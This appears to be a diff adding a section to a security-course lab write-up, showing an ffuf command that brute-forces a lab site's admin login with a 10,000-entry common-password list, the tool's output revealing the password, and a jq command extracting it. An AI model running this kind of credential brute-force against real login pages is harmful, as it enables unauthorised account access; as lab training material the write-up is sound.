@@ -237,3 +237,57 @@ cat 1-flag.txt
 
 ```
 
+## `ffuf` -of json
+
+```bash
+
+ffuf \
+  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+  -u "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=FUZZ" \
+  -mc 302 \
+  -k \
+  -of json \
+  -o admin-pass.json
+
+
+
+#         /'___\  /'___\           /'___\       
+#        /\ \__/ /\ \__/  __  __  /\ \__/       
+#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+#          \ \_\   \ \_\  \ \____/  \ \_\       
+#           \/_/    \/_/   \/___/    \/_/       
+# 
+#        v2.1.0-dev
+# ________________________________________________
+# 
+#  :: Method           : POST
+#  :: URL              : https://web-80-47-145.cod-eu-west-3.hbtn.io/login
+#  :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+#  :: Header           : Content-Type: application/x-www-form-urlencoded
+#  :: Data             : username=admin&password=FUZZ
+#  :: Output file      : admin-pass.json
+#  :: File format      : json
+#  :: Follow redirects : false
+#  :: Calibration      : false
+#  :: Timeout          : 10
+#  :: Threads          : 40
+#  :: Matcher          : Response status: 302
+# ________________________________________________
+# 
+# password                [Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 1591ms]
+# :: Progress: [10000/10000] :: Job [1/1] :: 11 req/sec :: Duration: [0:14:05] :: Errors: 0 ::
+
+
+
+
+# Extract psw
+
+#┌──(kali㉿kali)-[~/dlh-cyber_security/web_application_security/0x0B_WEBSEC]
+#└─$ 
+jq -r '.results[].input.FUZZ' admin-pass.json
+# password
+```
